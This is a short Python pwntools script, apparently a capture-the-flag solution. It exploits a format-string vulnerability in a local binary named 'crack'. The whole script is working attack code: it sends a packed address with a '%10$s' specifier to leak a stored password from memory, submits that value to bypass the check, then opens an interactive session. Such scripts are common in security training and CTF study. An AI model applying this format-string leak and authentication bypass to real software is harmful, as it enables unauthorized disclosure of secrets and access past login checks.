#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

io = process('./crack')
context.log_level = 'debug'

offset = 10
password_addr = 0x0804A048

io.recvuntil('?')
io.sendline(p32(password_addr)+"!%10$s!")
io.recvuntil("!")
p = io.recvuntil("!")
password = u32(p[:4])

io.recvuntil("Your password :")
io.sendline(str(password))
io.interactive()
